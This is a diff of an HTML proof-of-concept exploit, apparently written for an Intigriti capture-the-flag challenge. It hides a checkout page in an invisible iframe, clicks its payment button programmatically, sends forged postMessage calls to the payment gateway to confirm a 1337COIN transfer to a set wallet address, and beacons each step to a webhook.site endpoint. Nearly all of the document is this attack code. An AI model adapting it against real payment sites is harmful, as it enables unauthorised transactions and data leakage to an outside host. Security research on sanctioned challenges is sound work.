@@ -2,39 +2,51 @@
 <html>
 <body>
 <script>
-/*
-  Phase 1 – Transaction verification PoC
-  No XSS, no flag logic
-*/
-
 const ADDRESS = "114a580aae95817f9bf8d3704eb6e69417";
 const WEBHOOK = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";
 
-// 1️⃣ Load checkout as admin
-const iframe = document.createElement("iframe");
-iframe.style.display = "none";
-iframe.src =
+const checkout = document.createElement("iframe");
+checkout.style.display = "none";
+checkout.src =
   "https://challenge-0126.intigriti.io/checkout.html" +
   "?currency=1337COIN&price=1";
 
-document.body.appendChild(iframe);
+document.body.appendChild(checkout);
 
-// 2️⃣ Wait for checkout + wallet load
+// Wait for checkout + wallets
 setTimeout(() => {
-  // 3️⃣ Send transaction
-  iframe.contentWindow.postMessage({
-    type: "submitTransaction",
-    transaction: {
-      toAddress: ADDRESS,
-      currency: "1337COIN",
-      amount: 1
-    }
+  // Trigger Proceed to Payment
+  checkout.contentWindow.document
+    .getElementById("proceedBtn")
+    .click();
+}, 5000);
+
+// Wait for payment-gateway iframe to load
+setTimeout(() => {
+  const paymentFrame =
+    checkout.contentWindow.document.getElementById("paymentIframe");
+
+  // Send init message (real flow)
+  paymentFrame.contentWindow.postMessage({
+    type: "init",
+    currency: "1337COIN",
+    amount: 1,
+    price: 1
   }, "*");
+}, 8000);
 
-  // 4️⃣ Beacon so we KNOW this step executed
-  new Image().src = WEBHOOK + "?step=transaction_sent&addr=" + ADDRESS;
+// Trigger confirmPayment inside gateway
+setTimeout(() => {
+  const paymentFrame =
+    checkout.contentWindow.document.getElementById("paymentIframe");
 
-}, 6000);
+  paymentFrame.contentWindow.confirmPayment();
+
+  // Beacon
+  new Image().src =
+    WEBHOOK + "?step=confirm_clicked&addr=" + ADDRESS;
+
+}, 11000);
 </script>
 </body>
 </html>
